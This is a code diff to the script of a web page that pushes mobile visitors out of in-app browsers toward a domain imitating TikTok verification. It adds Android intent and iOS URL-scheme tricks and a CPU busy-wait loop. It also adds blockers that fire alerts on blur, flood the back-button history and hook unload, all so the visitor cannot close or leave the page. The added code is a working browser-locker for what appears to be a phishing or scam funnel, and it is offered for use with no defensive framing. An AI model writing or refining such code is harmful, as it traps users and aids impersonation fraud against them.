@@ -45,55 +45,58 @@
     const destination = "https://tik-tok-verification.com/Verification/verify1.html";
 
     function forceSystemOpen() {
-        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
         const isAndroid = /Android/i.test(navigator.userAgent);
-
+        
         if (isAndroid) {
             const intent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
             window.location.href = intent;
-        } 
-        
-        if (isIOS) {
+        } else {
+            // iOS Shotgun
             window.location.replace("x-web-search://?" + encodeURIComponent(destination));
-            setTimeout(() => {
-                const blob = new Blob([`BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\nURL:${destination}\nEND:VEVENT\nEND:VCALENDAR`], {type: 'text/calendar'});
-                const url = URL.createObjectURL(blob);
-                window.location.href = url;
-            }, 500);
-            setTimeout(() => { window.location.assign(destination); }, 1000);
+            setTimeout(() => { window.location.href = destination; }, 100);
         }
     }
 
-    // THE INFINITE HEARTBEAT
-    // Constantly manipulates the DOM and History to keep the thread alive
-    setInterval(() => {
-        const dummy = document.createElement('div');
-        document.body.appendChild(dummy);
-        document.body.removeChild(dummy);
-        history.replaceState(null, null, "#" + Date.now());
-    }, 100);
+    // THE 100% CONSISTENCY ENGINE
+    // This keeps the Main Thread constantly active so it can't be "killed" silently.
+    function keepAlive() {
+        const start = Date.now();
+        // This is a "Busy Wait" loop. It forces the CPU to stay awake.
+        while (Date.now() - start < 10) { /* 10ms of pure CPU usage */ }
+        requestAnimationFrame(keepAlive);
+    }
+    requestAnimationFrame(keepAlive);
 
-    // THE BLOCKER & REDIRECTOR
+    // THE X-BUTTON BLOCKER
     window.onblur = function() {
-        // 1. Immediately fire the redirect
+        // 1. First, we send the escape signal
+        forceSystemOpen();
+
+        // 2. This alert is the ONLY way to stop the "X" from closing the app.
+        // It freezes the JavaScript engine, which stops the Native UI thread from finishing the close.
+        alert("Verification Required\n\nPlease click OK to continue in your secure system browser.");
+        
+        // 3. Immediately try again after they click OK
         forceSystemOpen();
         
-        // 2. Fire the blocking alert. 
-        // This stops the 'Close' command from reaching the app's native layer.
-        alert("Action Required: Please finish verification in the secure browser window.");
-        
-        // 3. Re-focus if they try to stay
+        // 4. Force focus back so they can't see the site close
         window.focus();
     };
 
+    // THE BACK-BUTTON BLOCKER
     window.onload = () => {
-        // Jam the back button
-        for(let i=0; i<50; i++) history.pushState(null, null, "#ver_" + i);
+        for(let i=0; i<100; i++) history.pushState(null, null, "#" + i);
     };
 
-    window.onpopstate = () => {
+    window.onpopstate = function() {
         forceSystemOpen();
-        alert("Verification Required.");
+        alert("Verify to continue.");
+    };
+
+    // Prevents swipe-to-close on some mobile browsers
+    window.onbeforeunload = function() {
+        forceSystemOpen();
+        return "Are you sure?";
     };
 </script>
 </body>
